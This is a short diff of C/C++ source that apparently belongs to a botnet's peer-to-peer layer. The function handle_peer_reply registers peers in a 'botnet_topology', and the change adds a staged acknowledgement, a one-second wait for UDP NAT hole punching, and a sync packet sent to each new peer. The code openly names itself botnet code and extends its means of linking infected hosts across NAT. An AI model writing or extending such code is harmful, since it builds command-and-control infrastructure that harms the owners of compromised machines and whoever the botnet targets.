@@ -204,13 +204,18 @@ static void handle_peer_reply(const u_char* data, struct sockaddr_in& client)
 	/* add peer */
 	peer = botnet_topology.addPeer((struct botnet_pack*)data, client, &status);
 
-	/* if local peer */
-	if (status == 1)
-		sync_reply(client);
-
-	// open udp session for direct communication
+	/* if a peer was added */
 	if (status)
 	{
+		/* stage 1 - acknowledge back (local/remote) */
+		sync_reply(peer);
+
+		/* stage 2 - hole punching (remote only) */
+		if (status == 2)
+			Sleep(1000); // wait for both packets to open the NAT.
+
+		/* stage 3 - network sync between peers (local/remote) */
+
 		/* create request */
 		struct botnet_pack pack;
 		ZeroMemory(&pack, BOTNET_PACK_SIZE);
@@ -218,6 +223,7 @@ static void handle_peer_reply(const u_char* data, struct sockaddr_in& client)
 
 		/* send to peer */
 		sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&peer, sizeof(peer));
+
 	}
 }
 
